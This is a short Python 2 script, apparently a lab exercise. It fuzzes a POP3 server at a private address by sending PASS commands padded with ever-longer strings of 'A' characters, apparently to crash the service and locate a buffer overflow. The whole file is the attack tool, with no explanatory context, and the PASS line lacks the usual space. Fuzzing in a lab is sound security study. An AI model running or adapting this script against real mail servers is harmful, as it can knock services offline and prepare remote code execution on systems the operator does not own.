#! /usr/bin/python
import socket
buffer=["A"]
count=100

while len(buffer)<=50:
	buffer.append("A"*count)
	count+=200
for string in buffer:
	
	try:	
		print "send len %d \"A\"" %len(string)
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(("10.1.1.24",110))
		s.recv(1024)
		s.send("USER text\r\n")
		s.recv(1024)
		s.send("PASS"+string+"\r\n")
		s.send("QUIT\r\n")
		s.close()
		print "Done"
	except:
		print "unknow wrong"
